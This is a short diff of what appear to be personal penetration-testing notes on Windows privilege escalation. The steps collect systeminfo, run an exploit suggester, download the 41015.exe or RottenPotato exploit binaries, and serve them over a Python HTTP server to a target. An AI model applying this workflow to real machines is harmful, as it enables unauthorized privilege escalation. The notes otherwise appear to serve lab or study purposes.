@@ -48,7 +48,7 @@ C:\Windows\system32 > systeminfo        #(copy/paste it on a note Windows 7.txt)
 
 $ ./windows-explit-suggester.py --database 2021-04-08.xls --systeminfo ~/Desktop/Windows7.txt             #(see the exploit lists, MS16-032 or 135 = win binaries = dangerous to execute. Cautious)
 
-#(DL the MS16-035 binary on Github = 41015.exe on the disk)
+#(DL the MS16-035 binary on Github = 41015.exe on the disk or try w/ rottenpotatos.exe (git))
 
 $ mv 41015.exe exploit.exe
 $ sudo python -m SimpleHTTPServer 80 ....
